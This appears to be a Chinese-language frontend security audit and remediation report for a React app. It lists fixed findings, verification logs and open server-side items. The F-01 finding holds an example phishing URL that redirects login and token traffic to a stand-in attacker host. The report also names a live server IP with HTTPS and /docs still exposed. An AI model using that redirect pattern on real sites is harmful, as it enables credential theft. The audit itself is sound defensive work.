# 前端安全审计与整改记录

- 审计日期：2026-11-14
- 审计范围：`pp5ee/user-sys-frontend`（React 19 + Vite 6，main@b271442 及本次改动）、构建产物、部署后的 <http://47.108.60.176>
- 方法：源码审阅（接口层、登录态、渲染、构建配置、部署脚本）、依赖审计（`npm audit`）、构建产物检查、线上响应头与产物比对、Vitest 单测 + Playwright 真机回归
- 边界：仓库内只改前端；服务器、nginx / Java 静态资源层、TLS 证书、后端接口权限不在本仓库，单独列为「部署侧待办」，交后端处理

## 结论摘要

前端修复 6 项（1 高、2 中、3 低/提示），依赖审计清零，31 个单测和 14 项真实浏览器回归全部通过，构建产物已带 CSP，**整改后的前端已经上线**。

**部署过程**：这台机器没有 `47.108.60.176` 的 SSH 密钥（`Permission denied (publickey)`），本地无法执行 `./deploy-frontend.sh`；由有服务器权限的一侧按 commit `caeee31` 构建并同步后，线上 `index.html`、JS、CSS 三个文件的 sha256 与本地构建完全一致（见第五节）。部署前线上跑的是另一版前端产物（D-01），本次一并纠正。**仍未关闭**：全站只有 HTTP、`/docs` 公网可访问（D-02、D-05）。

## 一、已修复

| 编号 | 级别 | 问题 | 状态 |
| --- | --- | --- | --- |
| F-01 | 高 | `?api=` 参数可把接口地址指到任意服务器，并持久化到 localStorage，构成凭据/token 钓鱼通道 | 已修复 |
| F-02 | 中 | 登录 token 长期存在 localStorage，同源脚本或共享电脑上可被长期复用 | 已修复（改 sessionStorage） |
| F-03 | 中 | 页面没有任何 CSP / Referrer-Policy，缺少对注入脚本、外链资源的兜底 | 已修复（构建时注入 + 服务器响应头，见 D-03） |
| F-04 | 低 | 开发依赖有 2 个 critical、1 个 moderate 漏洞（tinypool / @vitest/mocker） | 已修复 |
| F-05 | 低 | 部署脚本未校验主机指纹、未限制 `--delete` 目标、不检查产物 | 已修复 |
| F-06 | 提示 | 403（无权限）也被当成登录过期，会把已登录用户踢下线 | 已修复（仅 401 触发） |

### F-01 `?api=` 外部接口地址（CWE-601 / CWE-522）

`src/api.js` 原来的取值顺序是「URL 参数 → 环境变量 → localStorage」，且 `?api=` 会被写进 localStorage。攻击者发一条

```
http://47.108.60.176/?api=https://attacker.example
```

页面外观完全正常，用户输入的账号密码会 `POST` 到攻击者服务器，之后每次请求的 `Authorization: Bearer <token>` 也一并送出，并且在 localStorage 里长期生效。

**整改**：线上（非 localhost / 127.0.0.1 / file:）只允许同源 `/api`，忽略并清除 URL 参数、环境变量和 localStorage 里的历史地址；本地开发仍可用 `?api=`（不持久化）。地址只接受 `http(s)`，带用户名密码的 URL 直接丢弃。

### F-02 登录 token 存储

token 原来存在 `localStorage.ttb.session`，任何 XSS、同源页面或共用电脑上的下一位用户都能拿到 7 天有效的 token。

**整改**：会话改存 `sessionStorage`（刷新保持、关标签页失效、不跨标签页共享），启动和退出时清掉旧版本留在 `localStorage` 的 `ttb.session` / `ttb.apiBase`；读取时校验 token 必须是 ≤4096 的字符串，畸形数据直接清掉。

**残余风险**：XSS 仍能读到 sessionStorage。彻底解法是后端把会话改成 `HttpOnly; Secure; SameSite=Lax` Cookie，届时前端可以删掉这段存储逻辑（已交给后端评估）。

### F-03 内容安全策略

构建时通过 Vite 插件只往产物 `dist/index.html` 注入 CSP（开发模式 Vite 要插内联 HMR 脚本，所以不在源 `index.html` 里写死）：

```
default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
img-src 'self' data:; font-src 'self'; connect-src 'self' http://47.108.60.176 http://localhost:* http://127.0.0.1:*;
object-src 'none'; media-src 'none'; frame-src 'none'; worker-src 'none'; base-uri 'none'; form-action 'self'
```

同时给页面加了 `<meta name="referrer" content="no-referrer">`。`connect-src` 里的本机地址只服务于本地 mock / 预览；线上同源部署时实际只会用到 `'self'`。

**注意**：`frame-ancestors` 写在 meta 里不生效，防点击劫持需要服务器返回 `X-Frame-Options: DENY`（见部署侧待办 D-02）。

### F-04 依赖漏洞

`npm audit` 原报 3 个漏洞：tinypool 原型污染导致 RCE（GHSA-5gmw-xhrv-c9v3、GHSA-85c8-ppgw-ccpr，critical）、@vitest/mocker 路径穿越 / 代码注入（GHSA-82fw-gwwq-j7x9、GHSA-qxg6-89mg-rqv8）。这些只在本地跑测试时用到，不进生产包，但仍升级 Vitest 3.2.7 → 5.1.0（Node 22 / Vite 6.4.6 满足要求），31 个用例全部通过，`npm audit` 现在为 0。生产依赖仍只有 React / React DOM。

### F-05 部署脚本

- `rsync --delete` 的目标增加白名单式校验，拒绝 `/`、`/var`、`/etc` 等系统目录和非绝对路径；
- ssh 增加 `StrictHostKeyChecking=accept-new`（首次记指纹、指纹变化即失败）和 `BatchMode=yes`（不挂起等密码）；
- 同步后文件权限收敛为目录 755 / 文件 644；
- 发布前检查 `dist/index.html` 含 `Content-Security-Policy`，缺失则中止，避免安全配置被绕过发布。

### F-06 403 被当成登录过期

接口层原来对 401 和 403 都触发「登录已过期」，删除/编辑没权限时会把用户直接踢下线。现只对 401 触发，403 仍按业务错误提示（后端权限校验不变）。

## 二、部署侧待办（本仓库改不了，交后端 / 服务器）

| 编号 | 级别 | 问题 | 证据 | 状态 |
| --- | --- | --- | --- | --- |
| D-01 | 高 | 线上前端产物与本仓库不一致，无法回溯来源 | 部署前线上引用 `/assets/index-CjZ3f-OG.js`（绝对路径，本仓库构建是 `./assets/`），包内没有 `resolveApiBase` / `?api` 逻辑，深链接用 `?task=` 而非 `#task-`，登录态仍写 localStorage | **已关闭**：已用 commit `caeee31` 的构建覆盖，线上三个文件 sha256 与本地一致 |
| D-02 | 高 | 全站只有 HTTP，443 连不上，密码和 Bearer token 明文传输 | `https://47.108.60.176` 仍返回 `SSL_ERROR_SYSCALL`；Chromium 也提示 COOP 头因非 HTTPS 被忽略 | **未关闭**：上 TLS（证书 + 80→443 跳转）后再加 HSTS |
| D-03 | 中 | 静态页和接口没有任何安全响应头 | 部署前 80 端口响应只有 CORS 头 | **已关闭**：页面和 API 现在都返回 CSP / X-Frame-Options / X-Content-Type-Options / Referrer-Policy / Permissions-Policy / COOP / CORP；建议服务器 CSP 的 `script-src` 去掉 `'unsafe-inline'`（页面 meta 已收紧到 `'self'`，实际生效取交集） |
| D-04 | 中 | 接口 `Access-Control-Allow-Origin: *` | 部署前通配 | **已关闭**：带外部 `Origin` 请求已不再返回 `Access-Control-Allow-Origin`，只保留 `Vary: Origin` |
| D-05 | 低 | Swagger `/docs` 公网可访问 | `GET /docs` 仍返回 200 | **未关闭**：生产关闭或加鉴权 |

D-02、D-05 属于后端与服务器侧，本仓库无法修改，留作后端收尾项。

## 三、已检查、未发现问题的项

- 渲染层全部走 React 文本节点，没有 `dangerouslySetInnerHTML` / `innerHTML` / `eval` / `new Function`，任务标题、负责人、评论内容不能注入 HTML，存储型 XSS 被转义挡住；
- 鉴权走 `Authorization: Bearer`，不存在 Cookie 自动携带，CSRF 不成立；
- 前端删除/编辑按钮只是 UI 收敛，后端仍独立校验创建人 / 管理员权限（前序 29 个后端用例覆盖）；
- 生产包 `sourcemap: false`，线上 JS 无 `sourceMappingURL`，不泄露源码结构；
- 无第三方脚本、外链字体、CDN 依赖，`dist` 与 `screenshots` 未进仓库，仓库内无密钥或凭据；
- 深链接只接受数字任务 id，复制链接不含 token；
- 密码框 `type="password"`、`autocomplete` 区分登录/注册，提交后不在前端留存明文。

## 四、验证记录

```
$ npm test
Test Files  2 passed (2)
     Tests  31 passed (31)        # 21 项原有 + 10 项安全回归（接口地址策略、会话存储）

$ npm audit
found 0 vulnerabilities

$ node node_modules/vite/bin/vite.js build
✓ built in 391ms
dist/index.html 含 Content-Security-Policy

$ python3 tmp/react-e2e/mock_and_test.py   # 真实 Chromium + mock 后端
全部通过：14 项（登录/注册/退出、列表、搜索、新建、详情编辑、指派、状态、深链接、
删除二次确认、刷新保持、移动端、登录过期），无 CSP 违规或控制台错误
```

## 五、部署后复核（2026-11-14）

线上 <http://47.108.60.176> 已切到本次构建，逐文件比对：

```
index.html               86ccbb80c02f153f91222b3b51ff4b30c934c3615a9da01d5f70102582e11d26
assets/index-Du2WkpVb.js 5201348255680fb26f409e13b6a62422438f643a2b5e2ac6b4989eb3dd5e1304
assets/index-ByBJhMHT.css dfcd4b27a73412e2a28f14cee6c4f686c8aade8cdec43698dd56c71605e9f75c
以上 sha256 与本地 dist/ 完全一致
```

- 响应头：页面和 `/api/*` 都带 CSP（含 `frame-ancestors 'none'`）、`X-Frame-Options: DENY`、`X-Content-Type-Options: nosniff`、`Referrer-Policy: no-referrer`、`Permissions-Policy`、COOP / CORP；
- 未登录请求 `GET /api/auth/me` 返回 401 + `WWW-Authenticate: Bearer`，带外部 `Origin` 不再返回 `Access-Control-Allow-Origin`；
- 真实 Chromium 打开线上页：正常渲染登录页，无 CSP 违规；`localStorage` 为空，`sessionStorage` 无残留会话；首屏只请求同源 `http://47.108.60.176/api/auth/me`；
- 仍未关闭：`https://47.108.60.176` 连不上（D-02），`/docs` 返回 200（D-05）。

## 六、残余风险与后续

1. **HTTPS 未上**（D-02 最高优先）：登录密码和 Bearer token 仍走明文 HTTP，链路上的人可以截获；D-01 / D-03 / D-04 已随本次部署关闭。
2. token 在 sessionStorage，XSS 仍可读取；建议后端评估 HttpOnly Cookie 方案。
3. 登录接口的限流 / 锁定策略在前端不可见，建议后端补（防撞库）。
4. 建议后续把 `npm audit` 和「产物含 CSP」检查接进 CI，避免回退。
